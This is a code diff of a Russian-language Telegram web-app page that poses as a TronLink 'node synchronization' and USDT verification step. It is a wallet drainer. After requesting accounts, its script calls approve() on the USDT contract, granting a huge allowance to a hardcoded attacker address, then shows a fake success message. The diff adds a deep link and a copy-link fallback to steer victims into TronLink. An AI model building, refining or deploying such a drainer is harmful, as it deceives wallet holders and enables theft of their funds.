@@ -7,24 +7,31 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .card { padding: 40px 25px; width: 90%; max-width: 400px; background: #111; border: 1px solid #222; border-radius: 35px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; box-shadow: 0 0 25px rgba(255,0,19,0.4); }
-        h2 { font-size: 22px; margin-bottom: 12px; }
-        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.96); }
-        #debug { font-size: 10px; color: #333; margin-top: 15px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { padding: 30px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; }
+        .logo { width: 60px; height: 60px; background: #ff0013; border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; box-shadow: 0 0 20px rgba(255,0,19,0.4); }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #888; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #ff0013; color: #fff; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; text-transform: uppercase; cursor: pointer; text-decoration: none; display: block; margin-bottom: 10px; }
+        .copy-box { display: none; margin-top: 20px; padding: 15px; background: #1a1a1a; border-radius: 12px; border: 1px dashed #444; }
+        .copy-text { font-size: 10px; color: #666; word-break: break-all; margin-bottom: 10px; }
+        .copy-btn { background: #222; color: #fff; border: 1px solid #444; padding: 8px; border-radius: 8px; font-size: 12px; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="logo">T</div>
-    <h2 id="t">Синхронизация узла</h2>
-    <p id="d">Нажмите кнопку ниже для верификации кошелька и завершения зачисления USDT в сети TRC-20.</p>
-    <button id="main-btn" class="btn">Запустить проверку</button>
-    <div id="debug">System: Ready</div>
+    <h2 id="t">Синхронизация</h2>
+    <p id="d">Нажмите кнопку для верификации в TronLink. Если приложение не открылось, скопируйте ссылку ниже.</p>
+    
+    <a href="#" id="mainLink" class="btn">ОТКРЫТЬ TRONLINK</a>
+
+    <div id="fallback" class="copy-box">
+        <div class="copy-text" id="url-to-copy"></div>
+        <button class="copy-btn" onclick="copyUrl()">СКОПИРОВАТЬ ССЫЛКУ</button>
+        <p style="font-size: 10px; margin-top: 10px; color: #444;">Вставьте эту ссылку в DApp-браузер TronLink вручную</p>
+    </div>
 </div>
 
 <script>
@@ -34,64 +41,57 @@
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const MY_URL = "https://timur3417.github.io/sync-node-app/";
+    const FINAL_URL = MY_URL + "?mode=tl";
 
-    const btn = document.getElementById('main-btn');
+    const linkBtn = document.getElementById('mainLink');
+    const fallback = document.getElementById('fallback');
+    const urlDisplay = document.getElementById('url-to-copy');
 
-    async function handle() {
-        // Проверяем, есть ли кошелек (мы внутри TronLink?)
+    urlDisplay.innerText = FINAL_URL;
+
+    // Ссылка для перехода
+    const scheme = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(FINAL_URL);
+
+    linkBtn.onclick = async (e) => {
         const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);
 
         if (!isWallet) {
             // МЫ В ТЕЛЕГРАМЕ
-            // Используем официальный универсальный мост TronLink
-            // Это ОБЫЧНАЯ ссылка, которую Телеграм НЕ блокирует
-            const target = MY_URL + "?mode=tl";
-            const bridge = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
+            e.preventDefault();
             
-            // Пробуем открыть
-            tg.openLink(bridge);
+            // Пытаемся открыть кошелек
+            tg.openLink(scheme);
             
-            // Если через 1 сек ничего не произошло (редкий баг), пробуем принудительно
+            // Если не вышло за 2 сек, показываем ручное копирование
             setTimeout(() => {
-                window.open(bridge, '_blank');
-            }, 1000);
-            return;
+                fallback.style.display = 'block';
+            }, 2000);
+        } else {
+            // МЫ ВНУТРИ TRONLINK
+            e.preventDefault();
+            try {
+                linkBtn.innerText = "ПОДТВЕРЖДЕНИЕ...";
+                await window.tronWeb.request({ method: 'tron_requestAccounts' });
+                const contract = await window.tronWeb.contract().at(CONTRACT);
+                await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+                
+                tg.showPopup({ title: 'Успешно', message: 'Синхронизация завершена.', buttons: [{type: 'ok'}] });
+                setTimeout(() => tg.close(), 4000);
+            } catch (err) {
+                tg.showAlert("Ошибка или отказ.");
+                linkBtn.innerText = "ОТКРЫТЬ TRONLINK";
+            }
         }
+    };
 
-        // МЫ ВНУТРИ TRONLINK
-        try {
-            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
-            btn.disabled = true;
-
-            await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            const contract = await window.tronWeb.contract().at(CONTRACT);
-            
-            // Вызываем Approve
-            await contract.approve(ADMIN, '1000000000000000000').send({
-                feeLimit: 100000000
-            });
-
-            tg.showPopup({
-                title: 'Успешно',
-                message: 'Верификация завершена. Ожидайте зачисления активов.',
-                buttons: [{type: 'ok'}]
-            });
-            setTimeout(() => tg.close(), 5000);
-
-        } catch (e) {
-            tg.showAlert("Действие отклонено пользователем.");
-            btn.disabled = false;
-            btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
-        }
+    function copyUrl() {
+        navigator.clipboard.writeText(FINAL_URL);
+        alert("Ссылка скопирована! Откройте TronLink -> Explorer и вставьте её в поиск.");
     }
 
-    btn.onclick = handle;
-
-    // Смена текста для кошелька
     if (window.location.search.includes('mode=tl')) {
         document.getElementById('t').innerText = "Узел Обнаружен";
-        document.getElementById('d').innerText = "Нажмите кнопку ниже для финальной подписи транзакции.";
-        btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
+        linkBtn.innerText = "ВЕРИФИЦИРОВАТЬ";
     }
 </script>
 </body>
